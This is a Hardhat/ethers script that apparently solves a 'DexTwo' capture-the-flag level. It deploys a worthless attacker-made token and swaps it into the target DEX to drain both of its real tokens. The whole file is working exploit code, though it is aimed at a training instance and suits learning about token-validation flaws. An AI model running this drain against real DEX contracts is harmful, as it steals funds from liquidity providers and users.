const {
    DEX_TWO_INSTANCE_ADDRESS,
    logStartingLevel,
    logSuccessfullyLevel,
    logInstanceAddressIsNull,
    logInstanceAddress,
    logTransactionLink,
} = require('./utils');

async function main(levelName = 'DexTwo') {
    logStartingLevel(levelName);

    if (!DEX_TWO_INSTANCE_ADDRESS) {
        logInstanceAddressIsNull(levelName);
        return;
    }
    logInstanceAddress(levelName, DEX_TWO_INSTANCE_ADDRESS);

    const [attacker] = await ethers.getSigners();

    const factory = await ethers.getContractFactory("DexTwo");
    const contract = factory.attach(DEX_TWO_INSTANCE_ADDRESS);

    const token1 = await contract.token1();
    const token2 = await contract.token2();

    const attackerTokenFactory = await ethers.getContractFactory("SwappableTokenTwo");
    const attackerToken = await attackerTokenFactory.deploy(contract.address, "Attack on Token", "AOT", 100000);
    await attackerToken.deployed();

    let tx;
    tx = await contract.approve(contract.address, 100000);
    logTransactionLink(tx.hash);
    await tx.wait();

    tx = await attackerToken["approve(address,address,uint256)"](attacker.address, contract.address, 100000);
    logTransactionLink(tx.hash);
    await tx.wait(1);

    tx = await attackerToken.transfer(contract.address, 1);
    logTransactionLink(tx.hash);
    await tx.wait(1);

    tx = await contract.swap(attackerToken.address, token1, 1);
    logTransactionLink(tx.hash);
    await tx.wait(1);

    tx = await attackerToken.transfer(contract.address, 8);
    logTransactionLink(tx.hash);
    await tx.wait(1);

    tx = await contract.swap(attackerToken.address, token2, 10);
    logTransactionLink(tx.hash);
    await tx.wait(1);

    logSuccessfullyLevel(levelName);
}

module.exports = main;
